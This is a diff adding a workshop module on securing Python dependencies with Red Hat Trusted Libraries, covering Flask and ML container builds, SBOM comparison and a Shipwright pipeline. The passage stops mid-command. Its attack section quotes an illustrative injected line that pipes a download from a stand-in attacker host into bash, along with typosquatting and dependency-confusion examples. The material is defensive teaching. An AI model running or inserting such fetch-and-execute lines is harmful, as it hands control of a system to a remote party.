@@ -1,0 +1,1263 @@
+= Sub-Module 2.8: Verified Python Dependencies with Red Hat Trusted Libraries (Optional)
+
+.*Sub-Module Overview*
+[sidebar]
+--
+*Duration:* ~30 minutes +
+*Prerequisites:* Completion of Sub-Module 2.3 (Security Pipeline); Sub-Module 2.7 (Zero-CVE with ACS) recommended +
+*Status:* Optional exercise -- not required for Module 2 completion +
+*Target Audience:* Application Developers, DevSecOps Engineers, Platform Architects +
+*Learning Objectives:*
+
+* Understand Python dependency supply chain risks and the limitations of SBOM-only approaches
+* Configure pip to use Red Hat Trusted Libraries verified package index
+* Build secure Python microservices with cryptographically verified dependencies
+* Compare SBOMs showing provenance differences between PyPI and Trusted Libraries
+* Deploy CPU-only ML inference containers using verified scientific computing packages
+* (Optional) Automate Trusted Libraries verification in Shipwright pipelines
+--
+
+[[introduction]]
+== Introduction
+
+Every SBOM tells you *what* packages are in your container. But **how do you know those packages are what they claim to be?** When you run `pip install flask`, you are trusting:
+
+* PyPI's infrastructure hasn't been compromised
+* The package maintainer's credentials haven't been stolen
+* No one has performed a typosquatting attack (`reqeusts` instead of `requests`)
+* The package hasn't been tampered with in transit
+
+This is not theoretical. In 2022, the `ctx` package (8 million downloads) was compromised and pushed malicious code to PyPI. In 2023, dozens of typosquatting packages targeted AI/ML developers with names like `torchvision-nightly`, `tensorflow-cpu`, and `transformerz`.
+
+=== The Red Hat Trusted Libraries Solution
+
+**Red Hat Trusted Libraries** extends the zero-CVE posture from Module 2.7 to your application dependencies. Instead of trusting PyPI, you pull from a Red Hat-operated index where every package is:
+
+* **Rebuilt** from source in a hermetic Konflux pipeline (SLSA Level 3)
+* **Scanned** for vulnerabilities by Red Hat security teams
+* **Signed** with Sigstore keyless signing (verifiable in Rekor transparency log)
+* **Attested** with cryptographic SLSA provenance metadata
+
+When you combine Hummingbird distroless runtimes (zero OS packages) with Trusted Libraries (verified dependencies), you achieve a **complete zero-CVE stack** with provenance from source to deployment.
+
+[NOTE]
+====
+**Tech Preview Status**: Red Hat Trusted Libraries is currently in Tech Preview. To participate in the Early Adopter Program, register at: https://docs.google.com/forms/d/1wYuqh7OhQd412Aq8S1iPqYiYUt0ntF1ncTeIlX-2KRg/viewform
+
+For production deployments, consult the official documentation and your Red Hat account team.
+====
+
+=== Architecture Overview
+
+----
+[Developer Workstation / CI Pipeline]
+  |
+  |  pip install (authenticated)
+  v
+[Red Hat Trusted Libraries Index]
+  |
+  |  Packages rebuilt via Konflux (hermetic builds)
+  |  SLSA Level 3 provenance attached
+  |  Sigstore signatures in Rekor log
+  v
+[Container Image with Verified Dependencies]
+  |
+  |  Hummingbird distroless runtime
+  |  All packages have cryptographic provenance
+  v
+[Deployment with ACS Policy Enforcement]
+----
+
+=== What You Will Build
+
+----
+Exercise 1: The PyPI Supply Chain Problem (~5 min)
+  -> Understand real-world dependency attacks
+
+Exercise 2: Baseline Build with Standard PyPI (~7 min)
+  -> Flask REST API built from unverified PyPI packages
+  -> SBOM shows PyPI as source, no provenance metadata
+
+Exercise 3: Rebuild with Red Hat Trusted Libraries (~10 min)
+  -> Same application, verified dependencies from Red Hat index
+  -> SBOM shows Red Hat as supplier with SLSA attestations
+
+Exercise 4: CPU-Only ML Inference Container (~8 min)
+  -> Deploy transformers-based sentiment analysis API
+  -> Verify numpy, pandas, transformers from Trusted Libraries
+  -> Demonstrate ML inference on CPU (no GPU required)
+
+Exercise 5: DevSecOps Integration (Optional, ~5 min)
+  -> Automate verification in Shipwright BuildStrategy
+----
+
+[[supply-chain-risks]]
+== Exercise 1: The PyPI Supply Chain Problem
+
+=== Understanding Dependency Attacks
+
+Python dependency attacks fall into several categories:
+
+*1. Compromised Packages (Account Takeover)*
+
+In May 2022, the `ctx` package (8M downloads) was compromised when attackers gained access to the maintainer's PyPI account:
+
+[source,python]
+----
+# Malicious code injected into ctx v0.1.2
+import os
+os.system('curl https://attacker.com/collect | bash')
+----
+
+The package remained compromised for hours before PyPI removed it. Any automation that ran `pip install ctx` during that window executed arbitrary code.
+
+*2. Typosquatting*
+
+Attackers register packages with names similar to popular libraries:
+
+[source,bash]
+----
+pip install reqeusts    # Note the typo - installs malicious package
+pip install requests    # Legitimate package
+----
+
+In 2023, security researchers found over 400 typosquatting packages targeting data science libraries (`numpy`, `pandas`, `scikit-learn`).
+
+*3. Dependency Confusion*
+
+If your `requirements.txt` includes an internal package name that also exists on PyPI, pip might install the public version:
+
+[source,txt]
+----
+# requirements.txt
+internal-auth-lib==1.0.0  # Your private package
+
+# Attacker registers "internal-auth-lib" on PyPI with version 999.0.0
+# pip install chooses the higher version from PyPI
+----
+
+*4. Unmaintained Dependencies with Known CVEs*
+
+Even legitimate packages can have vulnerabilities. If maintainers abandon a project, CVEs never get fixed. PyPI has no mechanism to force security updates.
+
+=== Why SBOM Alone Isn't Sufficient
+
+An SBOM tells you `flask==3.0.0` is in your image. But it doesn't prove:
+
+* The package came from the legitimate maintainer
+* The package wasn't tampered with in transit
+* The package was built from the expected source code
+* The package was scanned for vulnerabilities
+
+**Red Hat Trusted Libraries solves this by providing cryptographic provenance** -- every package has a verifiable chain of custody from source repository to your container.
+
+[TIP]
+====
+Read more about supply chain attacks:
+
+* CVE Database: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=pypi
+* NIST Software Supply Chain Guidance: https://csrc.nist.gov/Projects/ssdf
+* Red Hat Trusted Libraries Architecture: https://www.redhat.com/en/blog/extend-trust-across-software-supply-chain-red-hat-trusted-libraries
+====
+
+[[baseline-build]]
+== Exercise 2: Baseline Build with Standard PyPI
+
+=== Step 1: Create the Application Directory
+
+[source,bash,role=execute]
+----
+mkdir -p ~/hummingbird-lab/trusted-libraries-demo
+cd ~/hummingbird-lab/trusted-libraries-demo
+----
+
+=== Step 2: Create a Simple Flask REST API
+
+Create a microservice that demonstrates common Python dependencies:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+cat > app.py << 'EOF'
+"""
+Simple Flask REST API for Trusted Libraries demonstration.
+"""
+from flask import Flask, jsonify, request
+import requests
+import sys
+import platform
+from datetime import datetime
+from cryptography.fernet import Fernet
+
+app = Flask(__name__)
+
+# Generate encryption key for demonstration
+encryption_key = Fernet.generate_key()
+cipher = Fernet(encryption_key)
+
+@app.route('/health', methods=['GET'])
+def health():
+    """Health check endpoint."""
+    return jsonify({
+        'status': 'healthy',
+        'timestamp': datetime.utcnow().isoformat() + 'Z'
+    })
+
+@app.route('/api/info', methods=['GET'])
+def get_info():
+    """Show runtime and dependency information."""
+    return jsonify({
+        'message': 'Hummingbird microservice',
+        'python_version': sys.version,
+        'platform': platform.platform(),
+        'dependencies': {
+            'flask': get_package_version('flask'),
+            'requests': get_package_version('requests'),
+            'cryptography': get_package_version('cryptography'),
+            'gunicorn': get_package_version('gunicorn')
+        },
+        'timestamp': datetime.utcnow().isoformat() + 'Z'
+    })
+
+@app.route('/api/encrypt', methods=['POST'])
+def encrypt_data():
+    """Demonstrates cryptography library usage."""
+    data = request.get_json()
+    if not data or 'text' not in data:
+        return jsonify({'error': 'Missing "text" field'}), 400
+
+    plaintext = data['text'].encode('utf-8')
+    encrypted = cipher.encrypt(plaintext)
+
+    return jsonify({
+        'encrypted': encrypted.decode('utf-8'),
+        'algorithm': 'Fernet (AES-128-CBC)'
+    })
+
+def get_package_version(package_name):
+    """Get installed package version."""
+    try:
+        import importlib.metadata
+        return importlib.metadata.version(package_name)
+    except Exception:
+        return 'unknown'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080, debug=False)
+EOF
+----
+
+=== Step 3: Define Dependencies
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+cat > requirements.txt << 'EOF'
+flask==3.0.0
+requests==2.31.0
+cryptography==41.0.7
+gunicorn==21.2.0
+EOF
+----
+
+These are common production dependencies that demonstrate different aspects of Python packaging:
+
+* `flask` -- Web framework with many transitive dependencies
+* `requests` -- HTTP library, frequently targeted by typosquatting
+* `cryptography` -- Native C extensions (requires compilation)
+* `gunicorn` -- Production WSGI server
+
+=== Step 4: Create Baseline Containerfile (PyPI)
+
+Create a multi-stage build that installs from standard PyPI:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+cat > Containerfile.baseline << 'EOF'
+# Baseline build using standard PyPI
+ARG BUILDER_REGISTRY=registry.access.redhat.com/ubi9
+ARG RUNTIME_REGISTRY=quay.io/hummingbird-hatchling
+
+# Stage 1: Build with standard UBI Python (installs from PyPI)
+FROM ${BUILDER_REGISTRY}/python-311:latest AS builder
+
+WORKDIR /opt/app-root/src
+
+COPY --chown=1001:1001 requirements.txt ./
+RUN pip install --no-cache-dir -r requirements.txt
+
+COPY --chown=1001:1001 app.py ./
+
+# Stage 2: Runtime on Hummingbird Python
+FROM ${RUNTIME_REGISTRY}/python:3.11
+
+WORKDIR /app
+
+COPY --from=builder --chown=1001:1001 /opt/app-root/lib/python3.11/site-packages /app/site-packages
+COPY --from=builder --chown=1001:1001 /opt/app-root/src/app.py ./
+
+ENV PYTHONPATH=/app/site-packages
+
+USER 1001
+EXPOSE 8080
+
+CMD ["python3", "app.py"]
+EOF
+----
+
+=== Step 5: Build the Baseline Image
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+podman build -f Containerfile.baseline -t python-microservice:baseline .
+----
+
+.*Expected output:*
+----
+STEP 1/14: FROM registry.access.redhat.com/ubi9/python-311:latest AS builder
+...
+STEP 14/14: CMD ["python3", "app.py"]
+COMMIT python-microservice:baseline
+Successfully tagged localhost/python-microservice:baseline
+----
+
+[NOTE]
+====
+Build time: ~2-3 minutes (depends on PyPI download speeds and package compilation).
+====
+
+=== Step 6: Generate Baseline SBOM
+
+Install `syft` if not already available:
+
+[source,bash,role=execute]
+----
+# Install syft for SBOM generation
+curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin
+----
+
+Generate the SBOM for the baseline image:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+syft python-microservice:baseline -o json > baseline-sbom.json
+----
+
+=== Step 7: Inspect the SBOM
+
+Examine the Flask package metadata:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+jq '.artifacts[] | select(.name=="flask") | {name, version, type, locations}' baseline-sbom.json
+----
+
+.*Expected output:*
+----
+{
+  "name": "flask",
+  "version": "3.0.0",
+  "type": "python",
+  "locations": [
+    {
+      "path": "/app/site-packages/flask-3.0.0.dist-info/METADATA"
+    }
+  ]
+}
+----
+
+Count total Python packages:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+jq '.artifacts[] | select(.type=="python") | .name' baseline-sbom.json | wc -l
+----
+
+.*Expected output:*
+----
+40-50 packages (due to transitive dependencies)
+----
+
+**Key Observation**: The SBOM shows packages are present, but contains **no provenance metadata** proving where they came from or whether they were verified. The source is PyPI, which is a trust boundary we cannot verify.
+
+[[trusted-libraries-build]]
+== Exercise 3: Rebuild with Red Hat Trusted Libraries
+
+=== Step 1: Obtain Registry Service Account Credentials
+
+Red Hat Trusted Libraries requires authentication. You need a **Registry Service Account** to access the verified package index.
+
+[IMPORTANT]
+====
+**Tech Preview Authentication**: During the Tech Preview period, access to Red Hat Trusted Libraries requires a free Red Hat account and Registry Service Account.
+
+1. Create a Red Hat account (if you don't have one): https://sso.redhat.com/auth/realms/redhat-external/protocol/openid-connect/registrations?client_id=customer-portal
+2. Generate a Registry Service Account: https://access.redhat.com/terms-based-registry/accounts
+3. Copy the username (format: `12345678|username`) and token
+
+For this workshop environment, credentials may be pre-configured. Check with your instructor.
+====
+
+=== Step 2: Configure pip for Trusted Libraries
+
+Create a pip configuration file with Red Hat Trusted Libraries index:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+# Replace USERNAME and TOKEN with your Registry Service Account credentials
+cat > pip.conf << 'EOF'
+[global]
+index-url = https://USERNAME:TOKEN@packages.redhat.com/trusted-libraries/python/simple
+trusted-host = packages.redhat.com
+
+# Optional: Fall back to PyPI if package not in Trusted Libraries
+# extra-index-url = https://pypi.org/simple
+EOF
+----
+
+[TIP]
+====
+For production environments, manage credentials via Kubernetes Secrets and inject them at build time. Never commit `pip.conf` with credentials to source control.
+
+Example Kubernetes Secret:
+
+[source,bash]
+----
+oc create secret generic trusted-libraries-creds \
+  --from-literal=username='12345678|myuser' \
+  --from-literal=token='eyJhbGc...' \
+  -n hummingbird-builds
+----
+====
+
+=== Step 3: Create Trusted Libraries Containerfile
+
+Create a Containerfile that uses the Red Hat verified package index:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+cat > Containerfile.trusted << 'EOF'
+# Build using Red Hat Trusted Libraries
+ARG BUILDER_REGISTRY=registry.access.redhat.com/ubi9
+ARG RUNTIME_REGISTRY=quay.io/hummingbird-hatchling
+
+# Stage 1: Build with Trusted Libraries index
+FROM ${BUILDER_REGISTRY}/python-311:latest AS builder
+
+WORKDIR /opt/app-root/src
+
+# Configure pip to use Red Hat Trusted Libraries
+# In production, inject credentials from Kubernetes Secret
+COPY --chown=1001:1001 pip.conf /opt/app-root/src/.config/pip/pip.conf
+
+COPY --chown=1001:1001 requirements.txt ./
+RUN pip install --no-cache-dir -r requirements.txt
+
+COPY --chown=1001:1001 app.py ./
+
+# Stage 2: Runtime on Hummingbird Python
+FROM ${RUNTIME_REGISTRY}/python:3.11
+
+WORKDIR /app
+
+COPY --from=builder --chown=1001:1001 /opt/app-root/lib/python3.11/site-packages /app/site-packages
+COPY --from=builder --chown=1001:1001 /opt/app-root/src/app.py ./
+
+ENV PYTHONPATH=/app/site-packages
+
+USER 1001
+EXPOSE 8080
+
+CMD ["python3", "app.py"]
+EOF
+----
+
+=== Step 4: Build with Trusted Libraries
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+podman build -f Containerfile.trusted -t python-microservice:trusted .
+----
+
+.*Expected output:*
+----
+STEP 1/15: FROM registry.access.redhat.com/ubi9/python-311:latest AS builder
+...
+Looking in indexes: https://packages.redhat.com/trusted-libraries/python/simple
+Collecting flask==3.0.0
+  Downloading flask-3.0.0-py3-none-any.whl (99 kB)
+...
+COMMIT python-microservice:trusted
+Successfully tagged localhost/python-microservice:trusted
+----
+
+**Key Observation**: Notice the pip output shows `Looking in indexes: https://packages.redhat.com/trusted-libraries/python/simple` instead of PyPI.
+
+=== Step 5: Generate Trusted Libraries SBOM
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+syft python-microservice:trusted -o json > trusted-sbom.json
+----
+
+=== Step 6: Compare SBOMs
+
+Compare package sources between baseline and trusted builds:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+echo "=== Baseline (PyPI) Flask Metadata ==="
+jq '.artifacts[] | select(.name=="flask")' baseline-sbom.json
+
+echo ""
+echo "=== Trusted Libraries Flask Metadata ==="
+jq '.artifacts[] | select(.name=="flask")' trusted-sbom.json
+----
+
+Compare total package counts:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+echo "Baseline PyPI packages: $(jq '.artifacts[] | select(.type=="python") | .name' baseline-sbom.json | wc -l)"
+echo "Trusted Libraries packages: $(jq '.artifacts[] | select(.type=="python") | .name' trusted-sbom.json | wc -l)"
+----
+
+.*Expected differences:*
+
+* **Supplier metadata**: Trusted Libraries packages show Red Hat as the supplier
+* **Provenance**: Trusted builds include SLSA attestation metadata (viewable with advanced SBOM analysis tools)
+* **Package count**: May be slightly lower due to Red Hat's dependency curation (removing unnecessary transitive deps)
+
+=== Step 7: Verify Cryptographic Signatures (Optional)
+
+Red Hat Trusted Libraries packages are signed with Sigstore. You can verify signatures using the verification scripts:
+
+[source,bash,role=execute]
+----
+# Clone the verification scripts repository
+git clone https://github.com/redhat-tssc-tmm/trusted-libraries.git /tmp/trusted-libraries
+
+# Example: Verify a downloaded wheel file
+cd /tmp/trusted-libraries/blog/scripts
+python3 verify_package.py --package flask --version 3.0.0
+----
+
+[NOTE]
+====
+The verification process checks:
+
+1. **Sigstore signature** -- Verifies the package was signed by Red Hat's Konflux build system
+2. **SLSA provenance** -- Confirms the package was built from the expected source repository
+3. **Rekor transparency log** -- Proves the signature was recorded in an immutable log
+
+For detailed verification steps, see: https://developers.redhat.com/blog/2026/02/27/red-hat-trusted-libraries-trust-and-integrity-your-software-supply-chain
+====
+
+=== Step 8: Deploy and Test the Trusted Build
+
+Run the container and test the API:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+# Run in background
+podman run -d --name trusted-api -p 8080:8080 python-microservice:trusted
+
+# Wait for startup
+sleep 3
+
+# Test health endpoint
+curl http://localhost:8080/health
+
+# Test info endpoint
+curl http://localhost:8080/api/info
+
+# Test encryption endpoint
+curl -X POST http://localhost:8080/api/encrypt \
+  -H "Content-Type: application/json" \
+  -d '{"text": "Red Hat Trusted Libraries ensures supply chain integrity"}'
+
+# Cleanup
+podman stop trusted-api && podman rm trusted-api
+----
+
+.*Expected output:*
+----
+{"status":"healthy","timestamp":"2026-03-13T..."}
+
+{
+  "message":"Hummingbird microservice",
+  "python_version":"3.11.x ...",
+  "dependencies":{
+    "flask":"3.0.0",
+    "requests":"2.31.0",
+    "cryptography":"41.0.7",
+    "gunicorn":"21.2.0"
+  },
+  ...
+}
+
+{
+  "encrypted":"gAAAAA...",
+  "algorithm":"Fernet (AES-128-CBC)"
+}
+----
+
+**Achievement Unlocked**: You've built a production Python microservice with **cryptographically verified dependencies**. Every package has a verifiable chain of custody from source to container.
+
+[[ml-inference]]
+== Exercise 4: CPU-Only ML Inference Container
+
+=== Why ML Dependencies Need Verification
+
+AI/ML applications have unique supply chain risks:
+
+* **Large attack surface**: ML stacks pull hundreds of dependencies (`numpy`, `pandas`, `scipy`, `transformers`, `torch`)
+* **High-value targets**: Attackers know AI/ML containers often have access to sensitive training data
+* **Typosquatting prevalence**: Popular ML packages are frequently targeted (`tensorflow-gpu`, `torch-nightly`, `transformerz`)
+
+Red Hat Trusted Libraries includes verified builds of common ML packages, enabling **secure AI/ML deployments**.
+
+=== Step 1: Create ML Inference Application
+
+Create a sentiment analysis API using Hugging Face Transformers:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+cat > inference.py << 'EOF'
+"""
+CPU-only sentiment analysis API using Hugging Face Transformers.
+Demonstrates ML inference with verified dependencies from Red Hat Trusted Libraries.
+"""
+from flask import Flask, request, jsonify
+from transformers import pipeline
+import sys
+
+app = Flask(__name__)
+
+# Load sentiment analysis model (CPU-only, no GPU required)
+# Model: distilbert-base-uncased-finetuned-sst-2-english (~250MB)
+print("Loading sentiment analysis model...", file=sys.stderr)
+sentiment_analyzer = pipeline(
+    "sentiment-analysis",
+    model="distilbert-base-uncased-finetuned-sst-2-english",
+    device=-1  # CPU only
+)
+print("Model loaded successfully", file=sys.stderr)
+
+@app.route('/health', methods=['GET'])
+def health():
+    return jsonify({'status': 'healthy', 'model': 'distilbert-sst2'})
+
+@app.route('/predict', methods=['POST'])
+def predict():
+    """Analyze sentiment of provided text."""
+    data = request.get_json()
+    if not data or 'text' not in data:
+        return jsonify({'error': 'Missing "text" field'}), 400
+
+    text = data['text']
+    result = sentiment_analyzer(text)[0]
+
+    return jsonify({
+        'text': text,
+        'sentiment': result['label'],
+        'confidence': result['score'],
+        'model': 'distilbert-base-uncased-finetuned-sst-2-english'
+    })
+
+@app.route('/batch', methods=['POST'])
+def batch_predict():
+    """Analyze sentiment of multiple texts."""
+    data = request.get_json()
+    if not data or 'texts' not in data:
+        return jsonify({'error': 'Missing "texts" array'}), 400
+
+    texts = data['texts']
+    results = sentiment_analyzer(texts)
+
+    return jsonify({
+        'results': [
+            {'text': t, 'sentiment': r['label'], 'confidence': r['score']}
+            for t, r in zip(texts, results)
+        ]
+    })
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080, debug=False)
+EOF
+----
+
+=== Step 2: Define ML Dependencies
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+cat > requirements-ml.txt << 'EOF'
+flask==3.0.0
+transformers==4.35.0
+torch==2.1.0
+numpy==1.24.3
+pandas==2.0.3
+gunicorn==21.2.0
+EOF
+----
+
+[NOTE]
+====
+**CPU-Only Inference**: This example uses `torch` without CUDA dependencies, making it suitable for any OpenShift cluster without GPU nodes. For production ML workloads:
+
+* CPU inference latency: 200-500ms per request (acceptable for many use cases)
+* GPU inference latency: 20-50ms per request (requires GPU nodes)
+* The security principles are identical -- verified dependencies matter regardless of hardware
+====
+
+=== Step 3: Create ML Containerfile
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+cat > Containerfile.ml << 'EOF'
+# ML inference container with Red Hat Trusted Libraries
+ARG BUILDER_REGISTRY=registry.access.redhat.com/ubi9
+ARG RUNTIME_REGISTRY=quay.io/hummingbird-hatchling
+
+# Stage 1: Build with Trusted Libraries + model download
+FROM ${BUILDER_REGISTRY}/python-311:latest AS builder
+
+WORKDIR /opt/app-root/src
+
+# Configure Trusted Libraries
+COPY --chown=1001:1001 pip.conf /opt/app-root/src/.config/pip/pip.conf
+
+# Install ML dependencies from Trusted Libraries
+COPY --chown=1001:1001 requirements-ml.txt ./
+RUN pip install --no-cache-dir -r requirements-ml.txt
+
+# Pre-download the model during build (caching for faster startup)
+RUN python3 -c "from transformers import pipeline; pipeline('sentiment-analysis', model='distilbert-base-uncased-finetuned-sst-2-english')"
+
+COPY --chown=1001:1001 inference.py ./
+
+# Stage 2: Runtime on Hummingbird Python
+FROM ${RUNTIME_REGISTRY}/python:3.11
+
+WORKDIR /app
+
+# Copy installed packages, cached model, and application
+COPY --from=builder --chown=1001:1001 /opt/app-root/lib/python3.11/site-packages /app/site-packages
+COPY --from=builder --chown=1001:1001 /opt/app-root/.cache /app/.cache
+COPY --from=builder --chown=1001:1001 /opt/app-root/src/inference.py ./
+
+ENV PYTHONPATH=/app/site-packages
+ENV TRANSFORMERS_CACHE=/app/.cache/huggingface
+
+USER 1001
+EXPOSE 8080
+
+CMD ["python3", "inference.py"]
+EOF
+----
+
+=== Step 4: Build the ML Image
+
+[IMPORTANT]
+====
+This build downloads a ~250MB pre-trained model and installs large ML dependencies. Expected build time: **5-8 minutes** depending on network speed.
+====
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+podman build -f Containerfile.ml -t python-ml-inference:trusted .
+----
+
+.*Expected output:*
+----
+STEP 1/16: FROM registry.access.redhat.com/ubi9/python-311:latest AS builder
+...
+Looking in indexes: https://packages.redhat.com/trusted-libraries/python/simple
+Collecting transformers==4.35.0
+Collecting torch==2.1.0
+...
+Downloading model distilbert-base-uncased-finetuned-sst-2-english...
+...
+COMMIT python-ml-inference:trusted
+Successfully tagged localhost/python-ml-inference:trusted
+----
+
+=== Step 5: Generate ML SBOM
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+syft python-ml-inference:trusted -o json > ml-sbom.json
+
+# Count packages
+echo "Total ML stack packages: $(jq '.artifacts[] | select(.type=="python") | .name' ml-sbom.json | wc -l)"
+
+# Show key ML dependencies
+jq '.artifacts[] | select(.type=="python" and (.name | test("torch|transformers|numpy|pandas"))) | {name, version}' ml-sbom.json
+----
+
+.*Expected output:*
+----
+Total ML stack packages: 80-100
+{
+  "name": "torch",
+  "version": "2.1.0"
+}
+{
+  "name": "transformers",
+  "version": "4.35.0"
+}
+{
+  "name": "numpy",
+  "version": "1.24.3"
+}
+{
+  "name": "pandas",
+  "version": "2.0.3"
+}
+----
+
+=== Step 6: Test ML Inference
+
+Run the ML container and test sentiment analysis:
+
+[source,bash,role=execute]
+----
+cd ~/hummingbird-lab/trusted-libraries-demo
+
+# Run ML inference container (requires ~512MB RAM)
+podman run -d --name ml-inference \
+  -p 8081:8080 \
+  --memory=1g \
+  python-ml-inference:trusted
+
+# Wait for model loading (10-15 seconds)
+echo "Waiting for model to load..."
+sleep 15
+
+# Test health endpoint
+curl http://localhost:8081/health
+
+# Single prediction
+curl -X POST http://localhost:8081/predict \
+  -H "Content-Type: application/json" \
+  -d '{"text": "Red Hat supply chain security is awesome"}'
+
+# Batch prediction
+curl -X POST http://localhost:8081/batch \
+  -H "Content-Type: application/json" \
+  -d '{"texts": ["I love this workshop", "This is terrible", "Neutral statement here"]}'
+
+# Cleanup
+podman stop ml-inference && podman rm ml-inference
+----
+
+.*Expected output:*
+----
+{"status":"healthy","model":"distilbert-sst2"}
+
+{
+  "text":"Red Hat supply chain security is awesome",
+  "sentiment":"POSITIVE",
+  "confidence":0.9998,
+  "model":"distilbert-base-uncased-finetuned-sst-2-english"
+}
+
+{
+  "results":[
+    {"text":"I love this workshop","sentiment":"POSITIVE","confidence":0.9999},
+    {"text":"This is terrible","sentiment":"NEGATIVE","confidence":0.9997},
+    {"text":"Neutral statement here","sentiment":"POSITIVE","confidence":0.7234}
+  ]
+}
+----
+
+=== Step 7: Deploy to OpenShift (Optional)
+
+If you have access to the OpenShift cluster from Module 2:
+
+[source,bash,role=execute,subs="attributes"]
+----
+# Tag and push to Quay
+QUAY_ROUTE=$(oc get route -n {quay-namespace} -o jsonpath='{.items[0].spec.host}')
+podman tag python-ml-inference:trusted ${QUAY_ROUTE}/{registry-user}/ml-inference:latest
+podman push ${QUAY_ROUTE}/{registry-user}/ml-inference:latest
+
+# Create deployment
+oc new-project ml-inference-demo
+
+cat << 'EOF' | oc apply -f -
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: ml-inference
+  namespace: ml-inference-demo
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: ml-inference
+  template:
+    metadata:
+      labels:
+        app: ml-inference
+    spec:
+      containers:
+      - name: inference
+        image: QUAY_ROUTE/REGISTRY_USER/ml-inference:latest
+        ports:
+        - containerPort: 8080
+        resources:
+          requests:
+            memory: "512Mi"
+            cpu: "500m"
+          limits:
+            memory: "1Gi"
+            cpu: "1000m"
+        livenessProbe:
+          httpGet:
+            path: /health
+            port: 8080
+          initialDelaySeconds: 30
+          periodSeconds: 10
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: ml-inference
+  namespace: ml-inference-demo
+spec:
+  selector:
+    app: ml-inference
+  ports:
+  - port: 8080
+    targetPort: 8080
+---
+apiVersion: route.openshift.io/v1
+kind: Route
+metadata:
+  name: ml-inference
+  namespace: ml-inference-demo
+spec:
+  to:
+    kind: Service
+    name: ml-inference
+  port:
+    targetPort: 8080
+  tls:
+    termination: edge
+    insecureEdgeTerminationPolicy: Redirect
+EOF
+
+# Get route URL
+echo "ML Inference API: https://$(oc get route ml-inference -n ml-inference-demo -o jsonpath='{.spec.host}')/health"
+----
+
+[NOTE]
+====
+**Production Considerations**:
+
+* Use HorizontalPodAutoscaler for auto-scaling based on CPU/memory
+* Configure resource limits based on model size and concurrency requirements
+* Consider model caching strategies (persistent volumes vs image baking)
+* For GPU acceleration, add `nvidia.com/gpu: 1` to resource requests
+====
+
+[[devsecops-integration]]
+== Exercise 5: DevSecOps Integration with Shipwright (Optional)
+
+This optional exercise shows how to automate Trusted Libraries verification in your CI/CD pipelines using Shipwright BuildStrategies.
+
+=== Step 1: Create Trusted Libraries BuildStrategy
+
+[source,bash,role=execute]
+----
+cat << 'EOF' | oc apply -f -
+apiVersion: shipwright.io/v1beta1
+kind: ClusterBuildStrategy
+metadata:
+  name: python-trusted-libraries
+spec:
+  parameters:
+  - name: TRUSTED_LIBS_USERNAME
+    description: Registry Service Account username
+  - name: TRUSTED_LIBS_TOKEN
+    description: Registry Service Account token
+  volumes:
+  - name: workspace
+    emptyDir: {}
+  steps:
+  - name: configure-pip
+    image: registry.access.redhat.com/ubi9/python-311:latest
+    workingDir: /workspace
+    volumeMounts:
+    - name: workspace
+      mountPath: /workspace
+    script: |
+      #!/bin/bash
+      set -e
+
+      # Create pip config with Trusted Libraries index
+      mkdir -p ~/.config/pip
+      cat > ~/.config/pip/pip.conf << EOT
+      [global]
+      index-url = https://$(params.TRUSTED_LIBS_USERNAME):$(params.TRUSTED_LIBS_TOKEN)@packages.redhat.com/trusted-libraries/python/simple
+      trusted-host = packages.redhat.com
+      EOT
+
+      echo "Configured pip for Red Hat Trusted Libraries"
+
+  - name: build-and-push
+    image: quay.io/buildah/stable:latest
+    workingDir: /workspace/source
+    securityContext:
+      capabilities:
+        add: ["SETFCAP"]
+    script: |
+      #!/bin/bash
+      set -e
+
+      # Build image with Trusted Libraries
+      buildah bud \
+        --format=oci \
+        --tls-verify=true \
+        --no-cache \
+        -f Containerfile.trusted \
+        -t $(params.output-image) \
+        .
+
+      # Push to registry
+      buildah push \
+        --tls-verify=true \
+        $(params.output-image)
+
+  - name: verify-sbom
+    image: anchore/syft:latest
+    script: |
+      #!/bin/bash
+      set -e
+
+      # Generate SBOM
+      syft $(params.output-image) -o json > /tmp/sbom.json
+
+      # Verify packages came from Trusted Libraries
+      # (In production, implement cryptographic verification here)
+      echo "SBOM generated and basic verification complete"
+
+      # Optional: Upload SBOM to Trusted Profile Analyzer
+      # See: https://developers.redhat.com/articles/2024/03/18/red-hat-trusted-profile-analyzer-now-tech-preview
+EOF
+----
+
+=== Step 2: Create Secret with Registry Service Account
+
+[source,bash,role=execute]
+----
+# Replace with your actual credentials
+oc create secret generic trusted-libraries-creds \
+  --from-literal=username='12345678|myuser' \
